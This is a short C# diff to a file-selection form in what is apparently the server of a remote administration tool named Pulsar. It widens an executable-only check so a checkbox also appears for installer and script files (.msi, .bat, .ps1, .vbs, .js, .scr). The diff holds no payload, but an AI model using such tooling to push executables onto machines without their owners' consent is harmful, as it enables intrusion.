@@ -192,12 +192,24 @@ namespace Pulsar.Server.Forms
                     txtPath.Text = ofd.FileName;
 
                     // Show checkbox1 only for .exe
-                    checkBox1.Visible =
-                        string.Equals(Path.GetExtension(ofd.FileName), ".exe", StringComparison.OrdinalIgnoreCase);
+                    checkBox1.Visible = IsRunnableBinary(ofd.FileName);
                 }
             }
         }
+        private bool IsRunnableBinary(string path)
+        {
+            string ext = Path.GetExtension(path).ToLowerInvariant();
 
+            // Add/remove whatever you want here
+            string[] runnable =
+            {
+        ".exe", ".msi", ".bat", ".cmd", ".ps1",
+        ".vbs", ".js", ".scr", ".com"
+        // ".reg"  <- optional
+    };
+
+            return runnable.Contains(ext);
+        }
 
         private void radioLocalFile_CheckedChanged(object sender, EventArgs e)
         {
